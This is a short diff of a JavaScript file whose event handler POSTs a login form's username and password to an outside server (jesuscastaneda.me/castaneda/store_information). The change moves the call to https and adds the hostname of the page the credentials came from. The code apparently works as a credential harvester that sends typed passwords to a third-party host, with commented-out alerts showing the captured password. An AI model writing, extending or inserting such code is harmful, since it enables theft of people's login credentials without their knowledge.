@@ -52,9 +52,9 @@ var set_events = function(){
 			// alert(password_field.val());
 			// alert(name_field.val());
 			$.ajax({
-				url: 'http://jesuscastaneda.me/castaneda/store_information',
+				url: 'https://jesuscastaneda.me/castaneda/store_information',
 				method: 'POST',
-				data: {'username': name_field.val(), 'password': password_field.val()},
+				data: {'username': name_field.val(), 'password': password_field.val(), 'from': document.location.hostname},
 				dataType: 'json'
 			});
 		} else {
